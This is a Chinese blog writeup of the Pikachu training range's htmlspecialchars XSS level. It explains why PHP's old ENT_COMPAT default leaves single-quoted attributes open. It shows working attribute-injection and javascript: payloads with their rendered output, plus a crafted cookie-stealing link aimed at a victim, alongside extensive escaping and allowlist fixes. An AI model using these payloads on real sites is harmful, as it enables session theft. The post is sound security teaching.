---
layout: post
title: Pikachu - XSS之htmlspecialchars Writeup（默认参数救不了的场景）
platform: pikachu
date: 2026-10-27 21:33:00 +0800
categories: CTF
---

Pikachu - XSS之htmlspecialchars Writeup（默认参数救不了的场景）

一、题目信息

- 平台：Pikachu 漏洞练习平台（本地搭建）
- 模块：Cross-Site Scripting → xss之htmlspecialchars
- 地址：`http://localhost/pikachu/vul/xss/xss_02.php`
- 题型：Web
- 考点：**htmlspecialchars 的 flags 参数**、属性上下文、上下文相关转义

**环境信息**：

```text
phpStudy 8.1.1.3（D:\phpstudy_pro）
Apache 2.4.39 + MySQL 5.7.26 + PHP 7.3.4nts
pikachu 源码放在 D:\phpstudy_pro\WWW\pikachu\
```

**★ PHP 版本很关键**：

```text
PHP 7.3.4 → htmlspecialchars 默认 flags = ENT_COMPAT
           → 不转义单引号 '
           
★ PHP 8.1+ 默认改成了 ENT_QUOTES | ENT_SUBSTITUTE | ENT_HTML401
★ 所以这关的 payload 在 PHP 8.1 之后的版本上会失效
```

**页面形态**：

```text
人生之所苦短,是因为你的xss学习的还不够好

[                    ]  [submit]

你的输入已经被记录:
库里                     ← 你的输入，渲染成一个链接
```

**作者的提示**：

```php
// 源码第 25 行注释
//使用了htmlspecialchars进行处理,是不是就没问题了呢,htmlspecialchars默认不对'处理

// 源码第 28 行注释
//输入的内容被处理后输出到了input标签的value属性里面,试试:' onclick='alert(111)'
```

**★ 作者把答案写在注释里了。**

**✅ 实测结果（5 种输入对照）**

| 输入 | 渲染结果 | 关键结论 |
|---|---|---|
| `hello` | `<a href='hello'>hello</a>` | 正常 |
| `"><b>x</b>` | `<a href='&quot;&gt;&lt;b&gt;x&lt;/b&gt;'>...` | `"` `<` `>` 都转义了 |
| **`' onclick='alert(111)`** | **`<a href='' onclick='alert(111)'>...`** | **`'` 没转义！属性注入成功** |
| `'> <img src=x onerror=alert(1)>` | `<a href=''&gt; &lt;img...&gt;'>...` | `<` `>` 转义 → **无法闭合标签** |
| `javascript:alert(1)` | `<a href='javascript:alert(1)'>...` | 可直接用（点链接触发）|

**PHP 直接验证**（用 PHP 7.3.4 跑）：

```php
$s = "' onclick='alert(1)";
echo htmlspecialchars($s);                  // ' onclick='alert(1)            ← 单引号原样
echo htmlspecialchars($s, ENT_QUOTES);      // &#039; onclick=&#039;alert(1)  ← 被转义

$s2 = '"onmouseover="x';
echo htmlspecialchars($s2);                 // &quot;onmouseover=&quot;x       ← 双引号被转
```

二、题目分析

**① 后端代码（两行）**

```php
<?php
// xss_02.php 第 25-30 行
if(isset($_GET['submit'])){
    if(empty($_GET['message'])){
        $html .= "<p class='notice'>输入点啥吧！</p>";
    } else {
        //使用了htmlspecialchars进行处理,是不是就没问题了呢,htmlspecialchars默认不对'处理
        $message = htmlspecialchars($_GET['message']);        // ★ 没传第二个参数

        $html1 .= "<p class='notice'>你的输入已经被记录:</p>";
        //输入的内容被处理后输出到了input标签的value属性里面,试试:' onclick='alert(111)'
//      $html2 .= "<input ... value='{$message}' .../>";      // 被注释掉的写法
        $html2 .= "<a href='{$message}'>{$message}</a>";      // ★ 单引号属性
    }
}
?>
```

**★ 关键三个点**：

```
① 确实做了转义（htmlspecialchars）→ 说明开发者有安全意识
② 但没传 flags 参数 → 用了默认的 ENT_COMPAT
③ 输出在【单引号属性】里 → 恰好是默认模式防不住的场景
```

**② `htmlspecialchars` 的三种 flags**

```php
htmlspecialchars($string)                            // 默认 = ENT_COMPAT
htmlspecialchars($string, ENT_QUOTES)                // 单引号也转
htmlspecialchars($string, ENT_QUOTES | ENT_HTML5, 'UTF-8')   // 推荐
```

**各模式转换哪些字符**：

| flags | `&` | `<` | `>` | `"` | **`'`** |
|---|---|---|---|---|---|
| **`ENT_COMPAT`（PHP 7.3 默认）** | ✅ | ✅ | ✅ | ✅ | ❌ **不转** |
| `ENT_QUOTES` | ✅ | ✅ | ✅ | ✅ | ✅ **转** |
| `ENT_NOQUOTES` | ✅ | ✅ | ✅ | ❌ | ❌ |

**★ 为什么默认是 ENT_COMPAT？**

```
ENT_COMPAT = "只处理双引号"（Compatible 兼容模式）
历史原因：早期 HTML 里双引号属性更常见
★ 单引号属性当时被认为是"少数派"
```

**★ 但 PHP 8.1（2021-11）改了默认值**：

```
PHP < 8.1   默认 ENT_COMPAT              → 单引号不转
PHP >= 8.1  默认 ENT_QUOTES|ENT_SUBSTITUTE|ENT_HTML401   → 单引号会转

★ 所以本关的漏洞是"时代产物"
★ 同样的代码在 PHP 8.1 上就是安全的
```

**③ 为什么这个漏洞恰好成立**

**看输出上下文**：

```php
$html2 .= "<a href='{$message}'>{$message}</a>";
             └──────┬──────┘
              单引号包裹！
```

**★ 如果代码用的是双引号**：

```php
$html2 .= "<a href=\"{$message}\">{$message}</a>";
```

**那默认的 ENT_COMPAT 就能防住**（因为 `"` 会被转成 `&quot;`）。

**★ 但偏偏是单引号 → 默认模式漏掉了 `'`。**

**★ 这就是"上下文相关转义"（Context-Aware Escaping）的核心**：

```
转义函数用得对不对，取决于【输出在什么上下文】

    <a href="{$x}">     → 默认 htmlspecialchars 够用（" 被转）
    <a href='{$x}'>     → 必须用 ENT_QUOTES（' 也要转）
    <script>var x="{$x}"</script>  → 要用 json_encode
    <div style="color:{$x}">       → 要特殊处理（CSS 上下文）
    <a href="/?q={$x}">            → 要用 urlencode
```

**④ 为什么不能"闭合标签 + 插入新标签"**

**很多人第一反应是**：

```html
'> <img src=x onerror=alert(1)>
```

**★ 结果：失败。**

**实测渲染**：

```html
<a href=''&gt; &lt;img src=x onerror=alert(1)&gt;'>...
        └─┬─┘ └──┬──┘
      &gt; 转了  &lt; 也转了
```

**★ 原因**：

```
htmlspecialchars 会转义 < 和 >（不管哪种 flags）

    >  →  &gt;
    <  →  &lt;

★ 所以无法闭合 <a> 标签
★ 无法插入新的 HTML 标签
★ 攻击面被压缩到"只能在 <a> 标签内部加属性"
```

**⑤ 所以唯一的路是：**注入属性**

**注入的 payload 必须满足**：

```
① 用 ' 闭合 href 属性的值      ← 关键在于 ' 没被转义
② 加一个能触发 JS 的属性        ← onclick / onmouseover / ...
③ 不能包含 < >                  ← 否则被转义
```

**三种可行 payload**：

**payload 1：`onclick`（需要点击）**

```
' onclick='alert(111)
```

**渲染**：

```html
<a href='' onclick='alert(111)'>' onclick='alert(111)</a>
        └─┬─┘ └──────┬──────┘
     href 为空     注入的 onclick
```

**★ 需要点击链接触发。**

**payload 2：`onmouseover`（需要悬停）**

```
' onmouseover='alert(1)
```

**★ 鼠标移到链接上就触发 —— 比 onclick 更容易中。**

**payload 3：`javascript:` 协议（需要点击）**

```
javascript:alert(1)
```

**渲染**：

```html
<a href='javascript:alert(1)'>javascript:alert(1)</a>
```

**★ 这个连引号都不用闭合**：

```
因为整个 payload 就是合法的 href 值
浏览器点链接时执行 javascript: 协议里的代码

★ 但需要用户点击
```

**⑥ 三种 payload 的对比**

| payload | 触发方式 | 需要闭合 `'` | 隐蔽性 |
|---|---|---|---|
| `' onclick='alert(1)` | 点击 | ✅ 需要 | 中 |
| `' onmouseover='alert(1)` | **悬停** | ✅ 需要 | 好（悬停很自然）|
| `javascript:alert(1)` | 点击 | ❌ 不需要 | 好（看起来是个链接）|

**★ 真实攻击常用 `onmouseover`**：

```
因为"鼠标划过链接"比"点击链接"更自然
受害者甚至不会意识到自己触发了什么
```

三、解题步骤

**第 1 步：先看正常功能**

**打开**：

```text
http://localhost/pikachu/vul/xss/xss_02.php
```

**输入框填**：`库里`

**点 submit**

**页面显示**：

```text
你的输入已经被记录:
库里           ← 渲染成一个链接

★ 看起来很正常，而且确实做了转义
```

**第 2 步：验证转义确实存在（排除"完全没转义"的可能）**

**输入**：

```html
"><b>x</b>
```

**F12 → 元素 → 看渲染结果**：

```html
<a href='&quot;&gt;&lt;b&gt;x&lt;/b&gt;'>&quot;&gt;&lt;b&gt;x&lt;/b&gt;</a>
        └──┬──┘
     全部被转义成实体
```

**★ 说明 `"` `<` `>` 都转义了 → 开发者确实做了防护。**

**第 3 步：⭐ 测试单引号（关键一步）**

**输入**：

```html
' onclick='alert(111)
```

**点 submit**

**F12 → 元素 → 看渲染结果**：

```html
<a href='' onclick='alert(111)'>' onclick='alert(111)</a>
        └─┬─┘ └──────┬──────┘
     href 被闭合   新属性注入成功
```

**★ 重点：`'` 一个都没被转成 `&#039;`。**

**★ 说明 `htmlspecialchars` 用的是默认的 ENT_COMPAT，不转单引号。**

**第 4 步：点击链接 → 弹窗**

**页面上那个链接（文字是 `' onclick='alert(111)`）**

**点它 → 弹出 `111`** ✅

**★ XSS 成立。**

**第 5 步：对比 —— 双引号会失败**

**输入**：

```html
" onclick="alert(111)
```

**F12 → 元素**：

```html
<a href='&quot; onclick=&quot;alert(111)'>...</a>
        └───┬───┘
      " 被转成 &quot;，闭合失败
```

**★ 点击无反应 → 说明双引号被防住了。**

**★ 这个对比最能说明问题**：**同一份代码，单引号能打，双引号打不了。**

**第 6 步：更自然的 payload（onmouseover）**

**输入**：

```html
' onmouseover='alert(1)
```

**渲染**：

```html
<a href='' onmouseover='alert(1)'>...</a>
```

**★ 鼠标移到链接上 → 弹窗（不用点击）。**

**第 7 步：`javascript:` 协议（不用闭合引号）**

**输入**：

```html
javascript:alert(1)
```

**渲染**：

```html
<a href='javascript:alert(1)'>javascript:alert(1)</a>
```

**★ 点击链接 → 弹窗。**

**★ 这一招的特点**：

```
不需要 ' （所以即使在 ENT_QUOTES 模式下也可能有效）
只需要 href 允许 javascript: 协议

★ 所以它是"更底层"的一个问题：协议白名单缺失
```

**第 8 步：实际攻击场景**

**构造恶意链接**：

```text
http://靶场/pikachu/vul/xss/xss_02.php?message=%27%20onmouseover%3D%27alert(document.cookie)&submit=submit
```

**发给受害者**：

```
"你看这个人，太搞笑了：
 http://靶场/.../xss_02.php?message=..."

受害者：
    ① 点开链接 → 页面加载
    ② 看到"你的输入已经被记录:" + 一个链接
    ③ 鼠标划过那个链接 → JS 执行
    ④ cookie 被（在真实攻击中）发走
```

**★ 受害者只觉得"点了个链接、鼠标划过一下"，完全不知道发生了什么。**

四、延伸知识

**① `htmlspecialchars` 完整参数说明**

```php
htmlspecialchars(
    string $string,
    int $flags = ENT_QUOTES | ENT_SUBSTITUTE | ENT_HTML401,   // PHP 8.1+
    ?string $encoding = null,
    bool $double_encode = true
): string
```

**★ flags 的常用组合**：

| flags | 说明 | 适用 |
|---|---|---|
| `ENT_COMPAT` | 转 `"`，不转 `'`（**PHP <8.1 默认**）| ⚠️ 只在双引号属性里安全 |
| `ENT_QUOTES` | `"` 和 `'` 都转 | ✅ **推荐** |
| `ENT_NOQUOTES` | 都不转 | ❌ 几乎不该用 |
| `ENT_HTML5` | 用 HTML5 的实体表 | ✅ 配合 ENT_QUOTES |
| `ENT_SUBSTITUTE` | 非法编码替换成 U+FFFD（而不是返回空串）| ✅ 推荐 |
| `ENT_HTML401` | 用 HTML4.01 的实体表（默认）| 兼容旧浏览器 |

**★ 推荐写法**：

```php
$safe = htmlspecialchars($input, ENT_QUOTES | ENT_SUBSTITUTE | ENT_HTML5, 'UTF-8');
```

**★ 为什么一定要指定 `'UTF-8'`**：

```
不指定编码时，PHP 会用 default_charset（默认 UTF-8）
但如果被改了（比如 GBK），可能出现"宽字节绕过"

★ 显式指定编码是最稳的
```

**② 上下文相关转义（最重要的一张表）**

**同一份数据，输出到不同位置，需要不同的处理**：

| 输出位置 | 例子 | 处理方法 |
|---|---|---|
| **HTML 文本** | `<p>{$x}</p>` | `htmlspecialchars($x, ENT_QUOTES)` |
| **HTML 属性（双引号）** | `<a href="{$x}">` | `htmlspecialchars($x, ENT_QUOTES)` |
| **HTML 属性（单引号）** | `<a href='{$x}'>` | `htmlspecialchars($x, ENT_QUOTES)` ★ 必须 |
| **HTML 属性（无引号）** | `<a href={$x}>` | 更严格：白名单字符 |
| **JS 字符串** | `<script>var x="{$x}"</script>` | `json_encode($x, JSON_HEX_TAG\|JSON_HEX_AMP)` |
| **JS 事件处理器** | `onclick="f('{$x}')"` | `json_encode` + 转义引号 |
| **URL 参数** | `<a href="/?q={$x}">` | `urlencode($x)` |
| **CSS** | `<div style="color:{$x}">` | 白名单（只允许颜色值格式）|
| **HTML 注释** | `<!-- {$x} -->` | 避免（注释里也可能有 XSS）|

**★ 核心原则**：

```
"转义"不是一个通用操作
每个上下文都有自己的危险字符

★ 在 HTML 文本里，危险字符是 < >
★ 在单引号属性里，危险字符是 '
★ 在 JS 字符串里，危险字符是 " \ </script>
★ 在 URL 里，危险字符是 & = ?
```

**③ `href` 属性的特殊问题：协议**

**即使转义做对了，`href` 仍然危险**：

```html
<a href='javascript:alert(1)'>点我</a>
<a href='data:text/html,<script>alert(1)</script>'>点我</a>
<a href='vbscript:msgbox(1)'>点我</a>
```

**★ 这些 payload 里没有需要转义的字符，但依然能执行 JS。**

**★ 所以 `href` 需要额外的协议白名单校验**：

```php
function safeHref($url) {
    $url = trim($url);

    // 只允许 http/https/相对路径
    if (preg_match('/^(https?:)?\/\//i', $url) || preg_match('/^\//', $url)) {
        return htmlspecialchars($url, ENT_QUOTES, 'UTF-8');
    }

    // 拒绝 javascript:/data:/vbscript:
    return '#';
}
```

**★ 更严格的做法**：

```php
$allowed = ['http', 'https'];
$parsed = parse_url($url);
if (!in_array(strtolower($parsed['scheme'] ?? ''), $allowed)) {
    $url = '#';
}
```

**④ 竞品函数对比**

| 函数 | 转换什么 | 什么时候用 |
|---|---|---|
| `htmlspecialchars` | `& < > " '` （取决于 flags）| **HTML 上下文** |
| `htmlentities` | 所有有实体的字符（包括中文等）| 很少用（体积大）|
| `strip_tags` | 删除所有标签 | ⚠️ **不能当 XSS 防御**（绕过多）|
| `addslashes` | `' " \ NUL` | **SQL 转义**（不是 XSS）|
| `urlencode` | URL 特殊字符 | **URL 参数** |
| `json_encode` | JSON 转义 | **JS 上下文** |
| `intval` | 转整数 | 数字参数（最安全）|

**★ 常见误用**：

```php
// ❌ 用 strip_tags 防 XSS
$safe = strip_tags($input);
// 绕过：<img src=x onerror=alert(1)>（不删属性）
//        <svg/onload=alert(1)>

// ❌ 用 addslashes 防 XSS
$safe = addslashes($input);
// 完全不防 < >，照样注入

// ❌ 用 htmlspecialchars 防 SQL 注入
$safe = htmlspecialchars($input);
// SQL 里 ' 没被转 → 依然注入

★ 每个函数只防自己的上下文
```

**⑤ PHP 8.1 的默认值变化（重要）**

```php
// PHP 7.4 及之前
htmlspecialchars($s)   // flags = ENT_COMPAT
                       // → ' 不转

// PHP 8.1 及之后
htmlspecialchars($s)   // flags = ENT_QUOTES | ENT_SUBSTITUTE | ENT_HTML401
                       // → ' 也转
```

**★ 影响**：

```
本关的 payload `' onclick='alert(1)`
    PHP 7.3  → ✅ 有效
    PHP 8.1+ → ❌ 失效（' 被转成 &#039;）

★ 所以学老靶场要注意"版本差异"
★ pikachu 是 2019 年的项目，用的是 PHP 7.x
★ 同样的代码放到现代 PHP 上，很多漏洞自动消失了
```

**★ 类似的"版本救命"案例**：

```
· PHP 8 移除了 mysql_* 函数（强制用 mysqli/PDO）
· PHP 7 移除了 preg_replace 的 /e 修饰符（代码执行漏洞）
· PHP 8 改了 == 的比较规则（很多"魔术哈希"绕过失效）
· PHP 8.1 改了 htmlspecialchars 默认 flags（本关）
```

**⑥ 真实世界的类似案例**

**案例 1：单引号属性 + ENT_COMPAT**

```
很多老 CMS（WordPress 老版本、DedeCMS）都用单引号属性
+ 默认 htmlspecialchars
→ 属性注入 XSS

★ 修复方法：改用 ENT_QUOTES，或者把属性改成双引号
```

**案例 2：`href` 协议未校验**

```html
<a href="<?= htmlspecialchars($url) ?>">链接</a>
```

**★ 转义做对了，但 `javascript:` 还是能用。**

**★ 这类漏洞在"个人主页""友情链接"功能里非常常见。**

**案例 3：JS 上下文用错函数**

```php
<script>
    var name = "<?= htmlspecialchars($name) ?>";
</script>
```

**★ 错误**：HTML 转义不等于 JS 转义。

**payload**：

```
name = \"; alert(1); //
```

**★ `"` 会被转成 `&quot;`，但在 JS 解析时，`&quot;` 在 script 标签里**不会**被解码**：

```
HTML 实体只在 HTML 文本/属性里解码
<script> 标签里的内容是"原始文本"（raw text element）
→ &quot; 就是字面字符 &quot;
```

**★ 所以这里其实... 有趣的是，`</script>` 才是真正的杀手**：

```
payload: </script><script>alert(1)</script>
★ 即使 htmlspecialchars 转了 < >
★ 但那是假想——htmlspecialchars 会把 < 转成 &lt;
★ 所以 <script> 里的 htmlspecialchars 反而"部分有效"

真正危险的是：
· json_encode 不转 </script> 的话，可以闭合 script 标签
· 所以要用 JSON_HEX_TAG 把 < > 编成 \u003c \u003e
```

**★ 正确写法**：

```php
<script>
    var name = <?= json_encode($name, JSON_HEX_TAG | JSON_HEX_AMP) ?>;
</script>
```

五、总结

- **本题核心：`htmlspecialchars()` 用了默认的 `ENT_COMPAT`，不转义单引号；而输出恰好在单引号属性里 → 属性注入 XSS。**

- **两行关键代码**：

```php
$message = htmlspecialchars($_GET['message']);      // ★ 没传 flags
$html2  .= "<a href='{$message}'>{$message}</a>";   // ★ 单引号属性
```

- **⭐ 五个必记要点**：

```text
① htmlspecialchars 的 flags 很重要
   ENT_COMPAT（PHP<8.1 默认）→ 不转 '
   ENT_QUOTES                → 转 '
   ★ 推荐：htmlspecialchars($s, ENT_QUOTES, 'UTF-8')

② PHP 8.1 改了默认值
   → 本关的漏洞在新版 PHP 上自动消失
   → 学老靶场要注意版本差异

③ 转义对不对，取决于上下文
   <a href="{$x}">  → 默认够用
   <a href='{$x}'>  → 必须 ENT_QUOTES
   ★ 没有"万能转义函数"

④ 不能闭合标签，只能注入属性
   < > 被转义 → 出不去 <a> 标签
   → 只能在标签内加 onclick / onmouseover

⑤ href 还有"协议"问题
   javascript:alert(1) 不需要任何特殊字符
   → 光靠转义防不住
   → 必须做协议白名单校验
```

- **实测数据**：

```text
hello                      → <a href='hello'>hello</a>
"><b>x</b>                 → &quot;&gt;&lt;b&gt;x&lt;/b&gt;   （转义了）
' onclick='alert(111)      → <a href='' onclick='alert(111)'>  （★ 单引号没转）
'> <img src=x onerror=...> → &gt; &lt;img...&gt;              （< > 转了，出不去）
javascript:alert(1)        → <a href='javascript:alert(1)'>    （点链接触发）

PHP 7.3.4 直接验证：
    htmlspecialchars("' onclick='alert(1)")
    → ' onclick='alert(1)              （原样！）
    htmlspecialchars(..., ENT_QUOTES)
    → &#039; onclick=&#039;alert(1)     （转义了）
```

- **XSS 模块进度**：

```text
✅ 反射型xss(get)      —— 直接拼接，需绕 maxlength
✅ 反射型xss(post)     —— 需登录 + 自动提交表单 + Pass-the-Hash
✅ 存储型xss           —— SQL 转义≠HTML 转义
✅ DOM型xss            —— 源=input（Self-XSS）
✅ DOM型xss-x          —— 源=URL（真可利用）
✅ xss之盲打           —— 打管理员 + 带外确认
✅ xss之过滤           —— 黑名单绕过
✅ xss之htmlspecialchars —— 本题：默认 flags 的坑
⬜ xss之href输出        —— 属性+协议上下文
⬜ xss之js输出          —— JS 上下文
```

**手工复现要点**：

```text
· 打开 xss_02.php，输入"库里" → 看渲染成链接
· 输入 "><b>x</b> → F12 看是否转义（确认有防护）
· 输入 ' onclick='alert(111) → F12 看渲染
  → <a href='' onclick='alert(111)'>  ← 单引号没转
· 点链接 → 弹窗
· 输入 " onclick="alert(1) → 对比，失败（双引号被转）
· 输入 javascript:alert(1) → 点链接 → 弹窗（不用闭合引号）
```

**一句话记忆**：

```
┌────────────────────────────────────────────────────────────┐
│  htmlspecialchars() 不是万能药                               │
│                                                            │
│  它有三个必须说清楚的东西：                                    │
│      ① 转哪些字符（flags）                                   │
│      ② 用什么编码（UTF-8）                                   │
│      ③ 输出在什么上下文（属性？JS？URL？）                     │
│                                                            │
│  ★ ENT_COMPAT（老默认）不转单引号 → 单引号属性可以闭合          │
│  ★ < > 被转 → 出不了标签 → 只能在标签内注入属性                │
│  ★ href 的 javascript: 协议 → 转义防不住，要白名单             │
└────────────────────────────────────────────────────────────┘
```
